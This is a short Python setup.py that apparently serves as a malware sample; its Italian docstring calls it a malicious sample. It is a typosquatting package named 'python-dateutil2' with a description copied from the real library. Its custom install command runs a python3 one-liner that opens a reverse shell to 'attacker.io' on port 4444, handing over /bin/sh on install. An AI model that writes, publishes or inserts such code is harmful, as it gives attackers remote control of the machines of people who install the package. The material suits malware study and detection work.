"""Campione malevolo: reverse shell nascosta in install hook."""
import os
import sys
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        # Reverse shell offuscata
        os.system(
            'python3 -c "import socket,subprocess,os;'
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect(('attacker.io',4444));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            'subprocess.call([\'/bin/sh\',\'-i\'])"'
        )

setup(
    name="python-dateutil2",  # typosquatting: python-dateutil
    version="2.9.0",
    description="Extensions to the standard Python datetime module",
    cmdclass={"install": PostInstall},
)
